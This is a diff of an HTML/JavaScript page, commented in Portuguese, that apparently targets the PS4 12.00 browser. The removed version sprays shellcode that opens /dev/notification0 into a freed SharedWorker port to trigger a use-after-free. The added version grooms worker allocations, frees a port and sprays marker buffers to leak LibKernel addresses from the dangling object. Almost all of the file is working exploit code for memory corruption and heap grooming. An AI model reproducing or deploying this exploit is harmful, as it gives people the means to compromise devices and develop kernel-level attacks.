@@ -2,175 +2,148 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 PoC (Lite Version)</title>
+    <title>PS4 12.00 UAF Leak Test</title>
     
 </head>
 <body>
 
-    <h1>PS4 12.00 Notificação PoC</h1>
-    <h3>Versão: Precision Lite (Sem OOM)</h3>
-    <div id="status">Status: Pronto.</div>
+    <h1>PS4 12.00 Info Leak Probe</h1>
+    <h3>Objetivo: Ler endereço da LibKernel via UAF</h3>
+    <div id="status">Status: Aguardando...</div>
     <div id="log"></div>
     <br>
-    <button onclick="start_lite()">DISPARAR EXPLOIT</button>
+    <button onclick="start_leak_test()">INICIAR SONDA DE LEAK</button>
 
     <script>
-        function log(msg, cls="info") {
+        function log(msg, type="") {
             var d = document.getElementById("log");
-            d.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            var line = `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            d.innerHTML += line;
             d.scrollTop = d.scrollHeight;
         }
 
-        function updateStatus(msg) {
-            document.getElementById("status").innerText = "Status: " + msg;
-        }
-
         // =================================================================
-        // 1. PAYLOAD: NOTIFICAÇÃO (Genérico)
+        // 1. ESTRUTURA DE LEAK (FAKE OBJECT)
         // =================================================================
-        var notify_shellcode = [
-            0x48, 0x31, 0xC0, 0x48, 0x89, 0xC2, 0x48, 0x89, 0xC6, 0x48, 0x8D, 0x3D, 0x44, 0x00, 0x00, 0x00,
-            0x48, 0xC7, 0xC0, 0x05, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x89, 0xC7, 0x48, 0x8D, 0x35, 0x45,
-            0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0x30, 0x0C, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x04, 0x00, 0x00,
-            0x00, 0x0F, 0x05, 0x48, 0x31, 0xC0, 0x48, 0xC7, 0xC0, 0x06, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3,
-            // Path: /dev/notification0
-            0x2F, 0x64, 0x65, 0x76, 0x2F, 0x6E, 0x6F, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F,
-            0x6E, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-            // Msg: HACKED!
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x41, 0x43, 0x4B, 
-            0x45, 0x44, 0x21, 0x00 
-        ];
-
-        // =================================================================
-        // 2. CONSTRUÇÃO DO FAKE OBJECT (Payload no Objeto)
-        // =================================================================
-        function prepare_payload() {
-            // Tamanho fixado em 0x400 (baseado nos seus testes de estabilidade 400->404)
-            var size = 0x400; 
+        // Em vez de shellcode, enchemos o objeto com padrões reconhecíveis
+        // para ver se conseguimos lê-los de volta.
+        function build_leak_spray() {
+            var size = 0x400; // Tamanho estável
             var buffer = new Uint32Array(size / 4);
 
-            // Converter bytes para Uint32
-            var shellcode_u32 = [];
-            for (var i = 0; i < notify_shellcode.length; i+=4) {
-                var val = notify_shellcode[i] | (notify_shellcode[i+1] << 8) | (notify_shellcode[i+2] << 16) | (notify_shellcode[i+3] << 24);
-                shellcode_u32.push(val);
+            // Preenchemos com marcadores visuais
+            // 0x41414141 = "AAAA"
+            // 0x42424242 = "BBBB"
+            for (var i = 0; i < buffer.length; i++) {
+                if (i % 2 == 0) buffer[i] = 0x41414141;
+                else buffer[i] = 0x42424242;
             }
-
-            // Preencher o objeto inteiro com o shellcode repetido
-            // Isso aumenta a chance de execução se o kernel pular para qualquer lugar dentro dele
-            for (var k = 0; k < buffer.length; k++) {
-                if (k % shellcode_u32.length === 0) {
-                    // Reinicia o padrão do shellcode
-                }
-                buffer[k] = shellcode_u32[k % shellcode_u32.length];
-            }
-            
             return buffer;
         }
 
         // =================================================================
-        // 3. EXECUÇÃO
+        // 2. ROTINA DE EXECUÇÃO
         // =================================================================
         var workers_stash = [];
 
-        async function start_lite() {
-            if (!window.SharedWorker) {
-                log("Navegador não suportado.", "err");
-                return;
-            }
-
-            var payload = prepare_payload();
-            log("Payload construído (Notificação).", "success");
-
-            // FASE 1: GROOMING (0-400)
-            updateStatus("Estabilizando Memória...");
-            log("Criando 400 Workers para estabilidade...", "info");
+        async function start_leak_test() {
+            if (!window.SharedWorker) return log("Navegador incompatível.");
             
-            var i = 0;
-            var groom_interval = setInterval(() => {
-                if (i >= 400) {
-                    clearInterval(groom_interval);
-                    start_pressure(payload); // Vai para fase 2
-                    return;
-                }
-                
-                // Cria em blocos de 50 para ser rápido mas não travar
-                for(let k=0; k<50; k++) {
-                    if (i >= 400) break;
-                    try {
-                        let w = new SharedWorker("data:text/javascript,1", "groom_" + i);
-                        w.port.start();
-                        workers_stash.push(w);
-                    } catch(e){}
-                    i++;
-                }
-            }, 50);
-        }
+            var fake_obj = build_leak_spray();
+            log("Payload de Leak construído.", "info");
 
-        function start_pressure(payload) {
-            log("Entrando na Zona de Perigo (401-404)...", "warn");
-            updateStatus("Aplicando Pressão...");
-            
-            var p_count = 0;
-            var interval = setInterval(() => {
-                // Ao atingir o limite (404), dispara
-                if (p_count >= 4) {
-                    clearInterval(interval);
-                    trigger_uaf(payload); 
-                    return;
-                }
-
+            // FASE 1: GROOMING
+            log("Grooming (400 workers)...", "info");
+            for(let i=0; i < 400; i++) {
                 try {
-                    let id = 401 + p_count;
-                    let w = new SharedWorker("data:text/javascript,1", "victim_" + id);
+                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                     w.port.start();
                     workers_stash.push(w);
-                    log(`Worker ${id} alocado.`);
-                } catch(e) {
-                    log("Erro crítico: " + e, "err");
-                }
-                
-                p_count++;
-            }, 200); // 200ms para garantir que o kernel processe o freeze
-        }
-
-        function trigger_uaf(payload) {
-            log("!!! DISPARANDO UAF NO WORKER 404 !!!", "err");
-            updateStatus("EXECUTANDO...");
-            
-            // 1. Pegar a vítima (Worker 404)
-            var victim = workers_stash.pop();
-
-            // 2. FREE
-            victim.port.close();
-            
-            // 3. SPRAY CIRÚRGICO (Sem OOM)
-            // 5000 cópias de 1KB = 5MB. Muito leve.
-            // Mas suficiente para preencher o buraco imediato.
-            log("Injetando código no buraco...");
-            var spray_copies = [];
-            for (var i = 0; i < 5000; i++) {
-                spray_copies.push(new Uint32Array(payload));
+                } catch(e){}
             }
 
-            // 4. ATIVAÇÃO
-            log("Forçando execução...", "warn");
-            try { 
-                victim.port.postMessage("PWN"); 
-                victim.port.start();
-            } catch(e){}
-
-            // Limpa referência
-            victim = null;
-
-            log("Aguardando notificação...", "success");
-            
-            setTimeout(() => {
-                alert("Se a notificação não apareceu, recarregue a página e tente novamente.");
-            }, 5000);
+            // FASE 2: PRESSÃO
+            log("Zona de Pressão (Buscando o 404)...", "warn");
+            var p_count = 0;
+            var interval = setInterval(() => {
+                if (p_count >= 4) {
+                    clearInterval(interval);
+                    probe_memory(fake_obj); // Inicia a sonda
+                    return;
+                }
+                try {
+                    let w = new SharedWorker("data:text/javascript,1", "v"+p_count);
+                    w.port.start();
+                    workers_stash.push(w);
+                    log(`Worker ${401+p_count} alocado.`);
+                } catch(e){}
+                p_count++;
+            }, 150);
         }
+
+        function probe_memory(payload) {
+            log("!!! INICIANDO UAF + LEAK !!!", "warn");
+            
+            // 1. Vítima
+            var victim = workers_stash.pop();
+            var port = victim.port; // Guardamos a referência da porta
+
+            // 2. FREE
+            port.close(); 
+            // NÃO anulamos a variável 'port'. Vamos tentar ler dela!
+
+            // 3. RECLAIM (Spray)
+            // Tenta colocar nosso objeto 'AAAA/BBBB' no lugar da porta
+            var copies = [];
+            for(var i=0; i<5000; i++) {
+                copies.push(new Uint32Array(payload));
+            }
+
+            // 4. A SONDA (LEAK PROBE)
+            log("Tentando ler propriedades do objeto morto...", "info");
+            
+            try {
+                // Tenta ler propriedades padrão que podem retornar dados da memória
+                // Se o objeto foi substituído, essas leituras vão pegar dados do nosso Spray
+                // ou ponteiros adjacentes.
+                
+                var probe1 = port.onmessage; 
+                log("Leitura 1 (onmessage): " + safe_print(probe1));
+
+                var probe2 = port.onmessageerror;
+                log("Leitura 2 (onmessageerror): " + safe_print(probe2));
+
+                // Tenta inspecionar o objeto inteiro
+                console.log(port); 
+                log("Objeto dumpado no console nativo (Pressione Options -> Console).");
+
+            } catch(e) {
+                log("Erro de leitura: " + e, "err");
+            }
+
+            // TESTE DE "TYPE CONFUSION"
+            // Se conseguirmos tratar a porta como outro tipo de objeto
+            try {
+                // Tenta ler como se fosse um array ou buffer (geralmente falha, mas vale tentar)
+                if (port.byteLength) {
+                    log("LEAK CRÍTICO: byteLength encontrado: " + port.byteLength, "leak");
+                }
+            } catch(e) {}
+
+            log("--- FIM DA SONDA ---");
+            log("Se você ver 'AAAA' ou números hexadecimais estranhos acima, TIRAR FOTO!");
+        }
+
+        function safe_print(val) {
+            if (val === null) return "null";
+            if (val === undefined) return "undefined";
+            if (typeof val === 'object') return "[Object]";
+            if (typeof val === 'function') return "[Function]";
+            
+            // Se for um número ou string, pode ser nosso leak!
+            return val.toString();
+        }
+
     </script>
 </body>
 </html>
